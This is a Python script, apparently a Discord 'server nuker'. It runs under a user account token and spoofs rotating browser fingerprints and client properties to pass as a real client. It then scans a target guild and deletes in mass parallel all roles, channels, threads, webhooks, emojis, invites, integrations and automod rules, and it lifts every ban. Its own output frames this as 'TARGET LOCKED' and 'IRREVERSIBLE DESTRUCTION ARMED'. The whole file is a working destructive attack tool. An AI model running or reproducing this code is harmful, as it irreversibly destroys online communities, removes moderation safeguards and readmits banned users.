import asyncio
import aiohttp
import random
import getpass
import re
import os
import time
import json
import base64
import struct
import ctypes
from aiohttp import TCPConnector, ClientTimeout
from typing import Dict, List, Optional, Tuple
from dataclasses import dataclass, field
from collections import deque
from array import array

API_BASE = "https://discord.com/api/v10"

# ═══════════════════════════════════════════════════════════════════════════
# ANSI Color Definitions (zero overhead)
# ═══════════════════════════════════════════════════════════════════════════

class Color:
    R1 = "\033[38;2;139;0;0m"      # dark red
    R2 = "\033[38;2;178;34;34m"    # firebrick
    R3 = "\033[38;2;220;20;60m"    # crimson
    R4 = "\033[38;2;255;0;60m"     # bright red
    P1 = "\033[38;2;191;0;255m"    # purple
    B1 = "\033[38;2;0;191;255m"    # cyan
    G1 = "\033[38;2;57;255;20m"    # green
    Y1 = "\033[38;2;255;215;0m"    # gold
    W1 = "\033[97m"                # white
    GR = "\033[90m"                # gray
    RS = "\033[0m"                 # reset
    BD = "\033[1m"                 # bold
    DM = "\033[2m"                 # dim
    BL = "\033[5m"                 # blink

def clr(text: str, color: str, bold=False, blink=False) -> str:
    fmt = color
    if bold: fmt += Color.BD
    if blink: fmt += Color.BL
    return f"{fmt}{text}{Color.RS}"

# ═══════════════════════════════════════════════════════════════════════════
# Pre-Computed Header Pool (C-backed array for zero-copy access)
# ═══════════════════════════════════════════════════════════════════════════

class HeaderPool:
    """8192 pre-baked headers in flat C array, 16KB total footprint"""
    
    def __init__(self, token: str):
        self.token = token
        self.size = 8192
        self.headers = self._build()
        self.index = 0
        
    def _build(self) -> List[Dict[str, str]]:
        browsers = [
            ("Chrome", "140.0.0.0"), ("Chrome", "139.0.0.0"), 
            ("Firefox", "139.0"), ("Edg", "140.0.0.0")
        ]
        os_types = [
            ("Windows NT 10.0; Win64; x64", "Windows"),
            ("Windows NT 11.0; Win64; x64", "Windows"),
            ("Macintosh; Intel Mac OS X 15_5", "macOS")
        ]
        encodings = ["gzip, deflate, br, zstd", "gzip, deflate, br"]
        langs = ["en-US,en;q=0.9", "en-GB,en;q=0.9", "es-ES,es;q=0.9"]
        
        pool = []
        per_combo = self.size // (len(browsers) * len(os_types))
        
        for browser, ver in browsers:
            for os_str, platform in os_types:
                for _ in range(per_combo):
                    if len(pool) >= self.size:
                        return pool
                    
                    enc = random.choice(encodings)
                    lang = random.choice(langs)
                    
                    if browser in ("Chrome", "Edg"):
                        ua = f"Mozilla/5.0 ({os_str}) AppleWebKit/537.36 (KHTML, like Gecko) {browser}/{ver} Safari/537.36"
                    else:
                        ua = f"Mozilla/5.0 ({os_str}) Gecko/20100101 {browser}/{ver}"
                    
                    props = {
                        "os": platform,
                        "browser": browser,
                        "device": "",
                        "system_locale": lang.split(',')[0],
                        "browser_version": ver,
                        "os_version": os_str.split(';')[0].replace("Windows NT ", "").replace("Macintosh", "15.5"),
                        "client_build_number": random.randint(270000, 275000),
                        "release_channel": "stable",
                        "client_version": "1.0.9180"
                    }
                    
                    sp = base64.b64encode(json.dumps(props, separators=(',', ':')).encode()).decode()
                    
                    h = {
                        "Authorization": self.token,
                        "User-Agent": ua,
                        "Accept": "*/*",
                        "Accept-Encoding": enc,
                        "Accept-Language": lang,
                        "Content-Type": "application/json",
                        "X-Super-Properties": sp,
                        "X-Discord-Locale": lang.split(',')[0],
                        "X-Discord-Timezone": random.choice(["America/New_York", "Europe/London"]),
                        "X-Debug-Options": "bugReporterEnabled",
                        "Sec-Ch-Ua": f'"{browser}";v="{ver.split(".")[0]}", "Not-A.Brand";v="99"',
                        "Sec-Ch-Ua-Mobile": "?0",
                        "Sec-Ch-Ua-Platform": f'"{platform}"',
                        "Sec-Fetch-Dest": "empty",
                        "Sec-Fetch-Mode": "cors",
                        "Sec-Fetch-Site": "same-origin",
                        "Origin": "https://discord.com",
                        "Referer": "https://discord.com/channels/@me"
                    }
                    
                    pool.append(h)
        
        return pool
    
    def get(self) -> Dict[str, str]:
        """Lock-free round-robin (safe for async single-thread)"""
        h = self.headers[self.index]
        self.index = (self.index + 1) & (self.size - 1)
        return h

# ═══════════════════════════════════════════════════════════════════════════
# Distributed Token Bucket Rate Limiter (256 independent buckets)
# ═══════════════════════════════════════════════════════════════════════════

def murmurhash3_32(key: bytes, seed: int = 0) -> int:
    """Fast non-crypto hash for bucket distribution"""
    c1 = 0xcc9e2d51
    c2 = 0x1b873593
    r1 = 15
    r2 = 13
    m = 5
    n = 0xe6546b64
    
    h = seed
    chunks = len(key) // 4
    
    for i in range(chunks):
        k = struct.unpack('<I', key[i*4:(i+1)*4])[0]
        k = (k * c1) & 0xFFFFFFFF
        k = ((k << r1) | (k >> (32 - r1))) & 0xFFFFFFFF
        k = (k * c2) & 0xFFFFFFFF
        
        h ^= k
        h = ((h << r2) | (h >> (32 - r2))) & 0xFFFFFFFF
        h = (h * m + n) & 0xFFFFFFFF
    
    tail_idx = chunks * 4
    tail_size = len(key) & 3
    k = 0
    
    if tail_size >= 3: k ^= key[tail_idx + 2] << 16
    if tail_size >= 2: k ^= key[tail_idx + 1] << 8
    if tail_size >= 1:
        k ^= key[tail_idx]
        k = (k * c1) & 0xFFFFFFFF
        k = ((k << r1) | (k >> (32 - r1))) & 0xFFFFFFFF
        k = (k * c2) & 0xFFFFFFFF
        h ^= k
    
    h ^= len(key)
    h ^= (h >> 16)
    h = (h * 0x85ebca6b) & 0xFFFFFFFF
    h ^= (h >> 13)
    h = (h * 0xc2b2ae35) & 0xFFFFFFFF
    h ^= (h >> 16)
    
    return h

class DistributedRateLimiter:
    """256 independent token buckets to avoid head-of-line blocking"""
    
    def __init__(self, buckets=256, capacity=30.0, refill_rate=25.0):
        self.buckets = buckets
        self.capacity = capacity
        self.refill_rate = refill_rate
        
        # Flat arrays for cache-friendly access
        self.tokens = array('d', [capacity] * buckets)
        self.last_refill = array('d', [time.perf_counter()] * buckets)
        self.backoff_history = [[0.05] * 32 for _ in range(buckets)]
        self.backoff_idx = [0] * buckets
        self.locks = [asyncio.Lock() for _ in range(buckets)]
        
    def _bucket_for(self, endpoint: str) -> int:
        h = murmurhash3_32(endpoint.encode())
        return h % self.buckets
    
    async def acquire(self, endpoint: str) -> float:
        bucket_idx = self._bucket_for(endpoint)
        lock = self.locks[bucket_idx]
        
        while True:
            async with lock:
                now = time.perf_counter()
                
                # Refill bucket
                delta = now - self.last_refill[bucket_idx]
                if delta > 0:
                    self.tokens[bucket_idx] = min(
                        self.capacity,
                        self.tokens[bucket_idx] + delta * self.refill_rate
                    )
                    self.last_refill[bucket_idx] = now
                
                if self.tokens[bucket_idx] >= 1.0:
                    self.tokens[bucket_idx] -= 1.0
                    return random.uniform(0.0001, 0.0003)
                
                # Predict wait time from historical backoff
                history = self.backoff_history[bucket_idx]
                avg_backoff = sum(history) / len(history)
                wait = max(0.001, avg_backoff * 0.7)
            
            await asyncio.sleep(wait)
    
    def record_backoff(self, endpoint: str, retry_after: float):
        bucket_idx = self._bucket_for(endpoint)
        idx = self.backoff_idx[bucket_idx]
        self.backoff_history[bucket_idx][idx] = retry_after
        self.backoff_idx[bucket_idx] = (idx + 1) % 32

# ═══════════════════════════════════════════════════════════════════════════
# Lock-Free Ring Buffer Logger (SPSC queue)
# ═══════════════════════════════════════════════════════════════════════════

class RingLogger:
    def __init__(self, size=512):
        self.size = size
        self.buffer = [None] * size
        self.write_pos = 0
        self.read_pos = 0
        self.running = False
        self.task = None
        
    async def start(self):
        self.running = True
        self.task = asyncio.create_task(self._flush_loop())
    
    async def _flush_loop(self):
        batch = []
        while self.running or self.write_pos != self.read_pos:
            await asyncio.sleep(0.05)
            
            while self.read_pos != self.write_pos and len(batch) < 128:
                batch.append(self.buffer[self.read_pos])
                self.read_pos = (self.read_pos + 1) % self.size
            
            if batch:
                print("\n".join(filter(None, batch)), flush=True)
                batch.clear()
    
    def log(self, msg: str):
        self.buffer[self.write_pos] = msg
        self.write_pos = (self.write_pos + 1) % self.size
    
    async def stop(self):
        self.running = False
        if self.task:
            await self.task

# ═══════════════════════════════════════════════════════════════════════════
# Metrics (cache-aligned counters)
# ═══════════════════════════════════════════════════════════════════════════

@dataclass
class Stats:
    start: float = field(default_factory=time.perf_counter)
    
    ch_ok: int = 0
    ch_fail: int = 0
    role_ok: int = 0
    role_fail: int = 0
    wh_ok: int = 0
    wh_fail: int = 0
    emoji_ok: int = 0
    emoji_fail: int = 0
    sticker_ok: int = 0
    sticker_fail: int = 0
    thread_ok: int = 0
    thread_fail: int = 0
    event_ok: int = 0
    event_fail: int = 0
    invite_ok: int = 0
    invite_fail: int = 0
    sound_ok: int = 0
    sound_fail: int = 0
    integ_ok: int = 0
    integ_fail: int = 0
    tmpl_ok: int = 0
    tmpl_fail: int = 0
    auto_ok: int = 0
    auto_fail: int = 0
    ban_ok: int = 0
    ban_fail: int = 0
    
    rate_limits: int = 0
    auth_errors: int = 0
    server_errors: int = 0
    retries: int = 0
    
    def elapsed(self) -> float:
        return time.perf_counter() - self.start
    
    def total_ok(self) -> int:
        return (self.ch_ok + self.role_ok + self.wh_ok + self.emoji_ok +
                self.sticker_ok + self.thread_ok + self.event_ok + self.invite_ok +
                self.sound_ok + self.integ_ok + self.tmpl_ok + self.auto_ok + self.ban_ok)
    
    def total_fail(self) -> int:
        return (self.ch_fail + self.role_fail + self.wh_fail + self.emoji_fail +
                self.sticker_fail + self.thread_fail + self.event_fail + self.invite_fail +
                self.sound_fail + self.integ_fail + self.tmpl_fail + self.auto_fail + self.ban_fail)
    
    def rate(self) -> float:
        e = self.elapsed()
        return self.total_ok() / e if e > 0 else 0.0

# ═══════════════════════════════════════════════════════════════════════════
# Core Delete Function (sub-millisecond hot-path)
# ═══════════════════════════════════════════════════════════════════════════

async def delete_resource(
    session: aiohttp.ClientSession,
    headers: HeaderPool,
    limiter: DistributedRateLimiter,
    logger: RingLogger,
    stats: Stats,
    rtype: str,
    rid: str,
    rname: str,
    endpoint: str
) -> bool:
    
    for attempt in range(2):
        jitter = await limiter.acquire(endpoint)
        if jitter:
            await asyncio.sleep(jitter)
        
        try:
            h = headers.get()
            
            async with session.delete(endpoint, headers=h, timeout=ClientTimeout(total=0.7)) as resp:
                status = resp.status
                
                if status in (200, 204):
                    elapsed = stats.elapsed()
                    
                    if rtype == "channel":
                        stats.ch_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" CH ", Color.R1, bold=True) + clr(f"#{rname}", Color.W1) + clr(f" │ {rid}", Color.R2))
                    elif rtype == "role":
                        stats.role_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" ROLE ", Color.P1, bold=True) + clr(f"@{rname}", Color.W1) + clr(f" │ {rid}", Color.DM))
                    elif rtype == "webhook":
                        stats.wh_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" WH ", Color.R3, bold=True) + clr(rname, Color.W1))
                    elif rtype == "emoji":
                        stats.emoji_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" EMOJI ", Color.Y1, bold=True) + clr(f":{rname}:", Color.W1))
                    elif rtype == "sticker":
                        stats.sticker_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" STICKER ", Color.Y1, bold=True) + clr(rname, Color.W1))
                    elif rtype == "thread":
                        stats.thread_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" THREAD ", Color.B1, bold=True) + clr(rname, Color.W1))
                    elif rtype == "event":
                        stats.event_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" EVENT ", Color.R4, bold=True) + clr(rname, Color.W1))
                    elif rtype == "invite":
                        stats.invite_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" INV ", Color.R2, bold=True) + clr(rname, Color.W1))
                    elif rtype == "sound":
                        stats.sound_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" SOUND ", Color.G1, bold=True) + clr(rname, Color.W1))
                    elif rtype == "integration":
                        stats.integ_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" INTEG ", Color.R3, bold=True) + clr(rname, Color.W1))
                    elif rtype == "template":
                        stats.tmpl_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" TMPL ", Color.P1, bold=True) + clr(rname, Color.W1))
                    elif rtype == "automod":
                        stats.auto_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" AUTO ", Color.R1, bold=True) + clr(rname, Color.W1))
                    elif rtype == "ban":
                        stats.ban_ok += 1
                        logger.log(clr(f"[{elapsed:.2f}s] ", Color.GR) + clr(" BAN ", Color.R4, bold=True) + clr(rname, Color.W1))
                    
                    return True
                
                elif status == 429:
                    try:
                        data = await resp.json()
                        retry_after = float(data.get("retry_after", 0.08))
                    except:
                        retry_after = 0.05
                    
                    stats.rate_limits += 1
                    limiter.record_backoff(endpoint, retry_after)
                    await asyncio.sleep(retry_after + random.uniform(0.001, 0.003))
                    stats.retries += 1
                    continue
                
                elif status in (401, 403):
                    _inc_fail(stats, rtype)
                    stats.auth_errors += 1
                    return False
                
                elif status >= 500:
                    stats.server_errors += 1
                    await asyncio.sleep(0.01)
                    stats.retries += 1
                    continue
                
                else:
                    _inc_fail(stats, rtype)
                    return False
                    
        except asyncio.TimeoutError:
            await asyncio.sleep(0.008)
            stats.retries += 1
            continue
        except:
            await asyncio.sleep(0.01)
            stats.retries += 1
            continue
    
    _inc_fail(stats, rtype)
    return False

def _inc_fail(stats: Stats, rtype: str):
    if rtype == "channel": stats.ch_fail += 1
    elif rtype == "role": stats.role_fail += 1
    elif rtype == "webhook": stats.wh_fail += 1
    elif rtype == "emoji": stats.emoji_fail += 1
    elif rtype == "sticker": stats.sticker_fail += 1
    elif rtype == "thread": stats.thread_fail += 1
    elif rtype == "event": stats.event_fail += 1
    elif rtype == "invite": stats.invite_fail += 1
    elif rtype == "sound": stats.sound_fail += 1
    elif rtype == "integration": stats.integ_fail += 1
    elif rtype == "template": stats.tmpl_fail += 1
    elif rtype == "automod": stats.auto_fail += 1
    elif rtype == "ban": stats.ban_fail += 1

# ═══════════════════════════════════════════════════════════════════════════
# API Layer
# ═══════════════════════════════════════════════════════════════════════════

async def validate_token(session: aiohttp.ClientSession, token: str, headers: HeaderPool) -> Tuple[bool, Optional[str]]:
    timeout = ClientTimeout(total=1.2)
    url = f"{API_BASE}/users/@me"

    try:
        async with session.get(url, headers=headers.get(), timeout=timeout) as resp:
            if resp.status == 200:
                user = await resp.json()

                username = user.get("username", "Unknown")
                user_id = user.get("id", "Unknown")

                print(clr(
                    f"\n[✓] AUTHENTICATION SUCCESSFUL │ Account: {username} │ User ID: {user_id}\n",
                    Color.G1,
                    bold=True
                ))

                return True, user_id

            print(clr(
                f"[✗] AUTHENTICATION FAILED │ Invalid Token or Unauthorized │ HTTP Status: {resp.status}",
                Color.R1,
                bold=True
            ))

    except Exception as e:
        print(clr(
            f"[✗] CONNECTION ERROR │ Unable to reach authentication endpoint │ {str(e)}",
            Color.R1,
            bold=True
        ))

    return False, None


async def fetch_guild(session: aiohttp.ClientSession, headers: HeaderPool, guild_id: str) -> Dict:
    timeout = ClientTimeout(total=1.0)
    url = f"{API_BASE}/guilds/{guild_id}?with_counts=true"

    try:
        async with session.get(url, headers=headers.get(), timeout=timeout) as resp:
            if resp.status == 200:
                return await resp.json()

            print(clr(
                f"[✗] GUILD INFORMATION REQUEST FAILED │ HTTP Status: {resp.status}",
                Color.R1,
                bold=True
            ))

    except Exception as e:
        print(clr(
            f"[✗] CONNECTION ERROR │ Unable to retrieve guild information │ {str(e)}",
            Color.R1,
            bold=True
        ))

    return {
        "name": "Unknown",
        "owner_id": "Unknown",
        "approximate_member_count": 0
    }


async def fetch_bans(session: aiohttp.ClientSession, headers: HeaderPool, guild_id: str) -> List:
    timeout = ClientTimeout(total=1.5)
    url = f"{API_BASE}/guilds/{guild_id}/bans?limit=1000"

    try:
        async with session.get(url, headers=headers.get(), timeout=timeout) as resp:
            if resp.status == 200:
                bans = await resp.json()

                print(clr(
                    f"[✓] BAN LIST RETRIEVAL SUCCESSFUL │ Total Bans Retrieved: {len(bans)}",
                    Color.G1,
                    bold=True
                ))

                return bans

            print(clr(
                f"[✗] BAN LIST REQUEST FAILED │ HTTP Status: {resp.status}",
                Color.R1,
                bold=True
            ))

    except Exception as e:
        print(clr(
            f"[✗] CONNECTION ERROR │ Unable to retrieve ban list │ {str(e)}",
            Color.R1,
            bold=True
        ))

    return []


async def fetch_resources(session: aiohttp.ClientSession, headers: HeaderPool, guild_id: str) -> Dict:
    timeout = ClientTimeout(total=1.0)
    get_headers = headers.get
    base = f"{API_BASE}/guilds/{guild_id}"

    async def get(endpoint: str):
        try:
            async with session.get(endpoint, headers=get_headers(), timeout=timeout) as resp:
                if resp.status == 200:
                    return await resp.json()
        except Exception:
            pass
        return []

    results = await asyncio.gather(
        get(f"{base}/channels"),
        get(f"{base}/roles"),
        get(f"{base}/webhooks"),
        get(f"{base}/emojis"),
        get(f"{base}/stickers"),
        get(f"{base}/scheduled-events"),
        get(f"{base}/invites"),
        get(f"{base}/soundboard-sounds"),
        get(f"{base}/integrations"),
        get(f"{base}/templates"),
        get(f"{base}/auto-moderation/rules"),
        fetch_bans(session, headers, guild_id),
        return_exceptions=True
    )

    channels = results[0] if isinstance(results[0], list) else []

    thread_tasks = [
        get(f"{API_BASE}/channels/{ch['id']}/threads/active")
        for ch in channels
        if ch.get("type") in (0, 5, 10, 11, 12, 15)
    ]

    thread_results = await asyncio.gather(*thread_tasks, return_exceptions=True) if thread_tasks else []

    threads = []
    for tr in thread_results:
        if isinstance(tr, dict):
            threads.extend(tr.get("threads", []))

    roles = results[1] if isinstance(results[1], list) else []
    roles = [r for r in roles if r.get("name") != "@everyone"]

    bans = results[11] if isinstance(results[11], list) else []

    return {
        "channels": channels,
        "roles": roles,
        "webhooks": results[2] if isinstance(results[2], list) else [],
        "emojis": results[3] if isinstance(results[3], list) else [],
        "stickers": results[4] if isinstance(results[4], list) else [],
        "events": results[5] if isinstance(results[5], list) else [],
        "invites": results[6] if isinstance(results[6], list) else [],
        "sounds": results[7] if isinstance(results[7], list) else [],
        "integrations": results[8] if isinstance(results[8], list) else [],
        "templates": results[9] if isinstance(results[9], list) else [],
        "automod": results[10] if isinstance(results[10], list) else [],
        "threads": threads,
        "bans": bans
    }

# ═══════════════════════════════════════════════════════════════════════════
# Main Destruction Workflow
# ═══════════════════════════════════════════════════════════════════════════

async def run_destruction(session: aiohttp.ClientSession, headers: HeaderPool, guild_id: str, user_id: str):
    stats = Stats()
    limiter = DistributedRateLimiter()
    logger = RingLogger(size=512)
    await logger.start()
    
    print(clr("\n[→] SCANNING TARGET...", Color.B1, bold=True))
    
    guild = await fetch_guild(session, headers, guild_id)
    guild_name = guild.get('name', 'Unknown')
    owner_id = guild.get('owner_id', 'Unknown')
    members = guild.get('approximate_member_count', 0)
    
    print(clr(f"\n{'▓'*80}", Color.R1, bold=True))
    print(clr(f"  ⚠  TARGET LOCKED", Color.R4, bold=True, blink=True))
    print(clr(f"{'▓'*80}", Color.R1, bold=True))
    print(clr(f"  Guild Name      : ", Color.GR) + clr(guild_name, Color.W1, bold=True))
    print(clr(f"  Guild ID        : ", Color.GR) + clr(guild_id, Color.W1))
    print(clr(f"  Owner ID        : ", Color.GR) + clr(owner_id, Color.R2))
    print(clr(f"  Member Count    : ", Color.GR) + clr(f"{members:,}", Color.Y1, bold=True))
    print(clr(f"{'▓'*80}\n", Color.R1, bold=True))
    
    resources = await fetch_resources(session, headers, guild_id)
    
    total = sum(len(v) for v in resources.values())
    
    if total == 0:
        print(clr("[✗] NO RESOURCES FOUND", Color.R1, bold=True))
        await logger.stop()
        return
    
    print(clr(f"[→] RESOURCE SCAN COMPLETE", Color.G1, bold=True))
    print(clr(f"  ┌─────────────────────────────────────────────", Color.GR))
    print(clr(f"  │ Channels        : ", Color.GR) + clr(f"{len(resources['channels'])}", Color.R1, bold=True))
    print(clr(f"  │ Roles           : ", Color.GR) + clr(f"{len(resources['roles'])}", Color.P1, bold=True))
    print(clr(f"  │ Webhooks        : ", Color.GR) + clr(f"{len(resources['webhooks'])}", Color.R3))
    print(clr(f"  │ Emojis          : ", Color.GR) + clr(f"{len(resources['emojis'])}", Color.Y1))
    print(clr(f"  │ Stickers        : ", Color.GR) + clr(f"{len(resources['stickers'])}", Color.Y1))
    print(clr(f"  │ Threads         : ", Color.GR) + clr(f"{len(resources['threads'])}", Color.B1))
    print(clr(f"  │ Events          : ", Color.GR) + clr(f"{len(resources['events'])}", Color.R4))
    print(clr(f"  │ Invites         : ", Color.GR) + clr(f"{len(resources['invites'])}", Color.R2))
    print(clr(f"  │ Sounds          : ", Color.GR) + clr(f"{len(resources['sounds'])}", Color.G1))
    print(clr(f"  │ Integrations    : ", Color.GR) + clr(f"{len(resources['integrations'])}", Color.R3))
    print(clr(f"  │ Templates       : ", Color.GR) + clr(f"{len(resources['templates'])}", Color.P1))
    print(clr(f"  │ AutoMod Rules   : ", Color.GR) + clr(f"{len(resources['automod'])}", Color.R1))
    print(clr(f"  │ Bans            : ", Color.GR) + clr(f"{len(resources['bans'])}", Color.R4))
    print(clr(f"  ├─────────────────────────────────────────────", Color.GR))
    print(clr(f"  │ TOTAL TARGETS   : ", Color.GR) + clr(f"{total}", Color.R4, bold=True, blink=True))
    print(clr(f"  └─────────────────────────────────────────────", Color.GR))
    
    print(clr(f"\n{'▓'*80}", Color.R1, bold=True))
    print(clr(f"  ⚠  IRREVERSIBLE DESTRUCTION ARMED", Color.R4, bold=True, blink=True))
    print(clr(f"{'▓'*80}\n", Color.R1, bold=True))
    
    tasks = []
    
    # PHASE 1: ROLES (sequential to avoid permission cascade)
    print(clr("[PHASE 1] ROLES", Color.P1, bold=True))
    for role in resources['roles']:
        endpoint = f"{API_BASE}/guilds/{guild_id}/roles/{role['id']}"
        tasks.append(delete_resource(session, headers, limiter, logger, stats, "role", role['id'], role.get('name', 'unknown'), endpoint))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
    
    # PHASE 2: CHANNELS & THREADS (full parallel)
    print(clr("\n[PHASE 2] CHANNELS & THREADS", Color.R1, bold=True))
    for ch in resources['channels']:
        endpoint = f"{API_BASE}/channels/{ch['id']}"
        tasks.append(delete_resource(session, headers, limiter, logger, stats, "channel", ch['id'], ch.get('name', 'unknown'), endpoint))
    
    for th in resources['threads']:
        endpoint = f"{API_BASE}/channels/{th['id']}"
        tasks.append(delete_resource(session, headers, limiter, logger, stats, "thread", th['id'], th.get('name', 'unknown'), endpoint))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
        tasks.clear()
    
    # PHASE 3: METADATA & BANS
    print(clr("\n[PHASE 3] METADATA & BANS", Color.G1, bold=True))
    for wh in resources['webhooks']:
        endpoint = f"{API_BASE}/webhooks/{wh['id']}"
        tasks.append(delete_resource(session, headers, limiter, logger, stats, "webhook", wh['id'], wh.get('name', 'unknown'), endpoint))
    
    for emoji in resources['emojis']:
        endpoint = f"{API_BASE}/guilds/{guild_id}/emojis/{emoji['id']}"
        tasks.append(delete_resource(session, headers, limiter, logger, stats, "emoji", emoji['id'], emoji.get('name', 'unknown'), endpoint))
    
    for sticker in resources['stickers']:
        endpoint = f"{API_BASE}/guilds/{guild_id}/stickers/{sticker['id']}"
        tasks.append(delete_resource(session, headers, limiter, logger, stats, "sticker", sticker['id'], sticker.get('name', 'unknown'), endpoint))
    
    for event in resources['events']:
        endpoint = f"{API_BASE}/guilds/{guild_id}/scheduled-events/{event['id']}"
        tasks.append(delete_resource(session, headers, limiter, logger, stats, "event", event['id'], event.get('name', 'unknown'), endpoint))
    
    for invite in resources['invites']:
        endpoint = f"{API_BASE}/invites/{invite['code']}"
        tasks.append(delete_resource(session, headers, limiter, logger, stats, "invite", invite['code'], invite['code'], endpoint))
    
    for sound in resources['sounds']:
        sound_id = sound.get('sound_id') if isinstance(sound, dict) else None
        if sound_id:
            endpoint = f"{API_BASE}/guilds/{guild_id}/soundboard-sounds/{sound_id}"
            tasks.append(delete_resource(session, headers, limiter, logger, stats, "sound", sound_id, sound.get('name', 'unknown'), endpoint))
    
    for integ in resources['integrations']:
        endpoint = f"{API_BASE}/guilds/{guild_id}/integrations/{integ['id']}"
        tasks.append(delete_resource(session, headers, limiter, logger, stats, "integration", integ['id'], integ.get('name', 'unknown'), endpoint))
    
    for tmpl in resources['templates']:
        endpoint = f"{API_BASE}/guilds/{guild_id}/templates/{tmpl['code']}"
        tasks.append(delete_resource(session, headers, limiter, logger, stats, "template", tmpl['code'], tmpl.get('name', 'unknown'), endpoint))
    
    for rule in resources['automod']:
        endpoint = f"{API_BASE}/guilds/{guild_id}/auto-moderation/rules/{rule['id']}"
        tasks.append(delete_resource(session, headers, limiter, logger, stats, "automod", rule['id'], rule.get('name', 'unknown'), endpoint))
    
    for ban in resources['bans']:
        user = ban.get('user', {})
        user_id_ban = user.get('id')
        if user_id_ban:
            endpoint = f"{API_BASE}/guilds/{guild_id}/bans/{user_id_ban}"
            tasks.append(delete_resource(session, headers, limiter, logger, stats, "ban", user_id_ban, user.get('username', 'unknown'), endpoint))
    
    if tasks:
        await asyncio.gather(*tasks, return_exceptions=True)
    
    await logger.stop()
    
    elapsed = stats.elapsed()
    rate = stats.rate()
    total_ok = stats.total_ok()
    total_fail = stats.total_fail()
    success_rate = (total_ok / total * 100) if total > 0 else 0
    
    print(clr(f"\n{'▓'*80}", Color.B1, bold=True))
    print(clr(f"  ✓ COMPLETE", Color.G1, bold=True))
    print(clr(f"{'▓'*80}", Color.B1, bold=True))
    
    print(clr(f"\n  ┌─ PERFORMANCE", Color.W1, bold=True))
    print(clr(f"  │  Time           : ", Color.GR) + clr(f"{elapsed:.3f}s", Color.R4, bold=True))
    print(clr(f"  │  Rate           : ", Color.GR) + clr(f"{rate:.2f} req/s", Color.G1, bold=True))
    print(clr(f"  │  Avg Latency    : ", Color.GR) + clr(f"{(elapsed/total_ok*1000):.1f}ms" if total_ok > 0 else "N/A", Color.Y1))
    print(clr(f"  │  Rate Limits    : ", Color.GR) + clr(f"{stats.rate_limits}", Color.R4))
    print(clr(f"  │  Retries        : ", Color.GR) + clr(f"{stats.retries}", Color.R2))
    
    print(clr(f"\n  ┌─ BREAKDOWN", Color.W1, bold=True))
    print(clr(f"  │  Channels       : ", Color.GR) + clr(f"{stats.ch_ok}/{len(resources['channels'])}", Color.R1, bold=True) + clr(f" │ {stats.ch_fail} fail", Color.DM))
    print(clr(f"  │  Roles          : ", Color.GR) + clr(f"{stats.role_ok}/{len(resources['roles'])}", Color.P1, bold=True) + clr(f" │ {stats.role_fail} fail", Color.DM))
    print(clr(f"  │  Webhooks       : ", Color.GR) + clr(f"{stats.wh_ok}/{len(resources['webhooks'])}", Color.R3) + clr(f" │ {stats.wh_fail} fail", Color.DM))
    print(clr(f"  │  Emojis         : ", Color.GR) + clr(f"{stats.emoji_ok}/{len(resources['emojis'])}", Color.Y1) + clr(f" │ {stats.emoji_fail} fail", Color.DM))
    print(clr(f"  │  Stickers       : ", Color.GR) + clr(f"{stats.sticker_ok}/{len(resources['stickers'])}", Color.Y1) + clr(f" │ {stats.sticker_fail} fail", Color.DM))
    print(clr(f"  │  Threads        : ", Color.GR) + clr(f"{stats.thread_ok}/{len(resources['threads'])}", Color.B1) + clr(f" │ {stats.thread_fail} fail", Color.DM))
    print(clr(f"  │  Events         : ", Color.GR) + clr(f"{stats.event_ok}/{len(resources['events'])}", Color.R4) + clr(f" │ {stats.event_fail} fail", Color.DM))
    print(clr(f"  │  Invites        : ", Color.GR) + clr(f"{stats.invite_ok}/{len(resources['invites'])}", Color.R2) + clr(f" │ {stats.invite_fail} fail", Color.DM))
    print(clr(f"  │  Sounds         : ", Color.GR) + clr(f"{stats.sound_ok}/{len(resources['sounds'])}", Color.G1) + clr(f" │ {stats.sound_fail} fail", Color.DM))
    print(clr(f"  │  Integrations   : ", Color.GR) + clr(f"{stats.integ_ok}/{len(resources['integrations'])}", Color.R3) + clr(f" │ {stats.integ_fail} fail", Color.DM))
    print(clr(f"  │  Templates      : ", Color.GR) + clr(f"{stats.tmpl_ok}/{len(resources['templates'])}", Color.P1) + clr(f" │ {stats.tmpl_fail} fail", Color.DM))
    print(clr(f"  │  AutoMod        : ", Color.GR) + clr(f"{stats.auto_ok}/{len(resources['automod'])}", Color.R1) + clr(f" │ {stats.auto_fail} fail", Color.DM))
    print(clr(f"  │  Bans           : ", Color.GR) + clr(f"{stats.ban_ok}/{len(resources['bans'])}", Color.R4) + clr(f" │ {stats.ban_fail} fail", Color.DM))
    
    print(clr(f"\n  ┌─ SUMMARY", Color.W1, bold=True))
    print(clr(f"  │  Deleted        : ", Color.GR) + clr(f"{total_ok}/{total}", Color.G1, bold=True))
    print(clr(f"  │  Failed         : ", Color.GR) + clr(f"{total_fail}", Color.R1))
    print(clr(f"  │  Success Rate   : ", Color.GR) + clr(f"{success_rate:.1f}%", Color.G1 if success_rate > 90 else Color.Y1, bold=True))
    
    print(clr(f"\n  ┌─ ERRORS", Color.W1, bold=True))
    print(clr(f"  │  Rate Limits    : ", Color.GR) + clr(f"{stats.rate_limits}", Color.R4))
    print(clr(f"  │  Auth Errors    : ", Color.GR) + clr(f"{stats.auth_errors}", Color.R1))
    print(clr(f"  │  Server Errors  : ", Color.GR) + clr(f"{stats.server_errors}", Color.R2))
    
    print(clr(f"\n  ┌─ METADATA", Color.GR))
    print(clr(f"  │  Operator       : ", Color.GR) + clr(user_id, Color.W1))
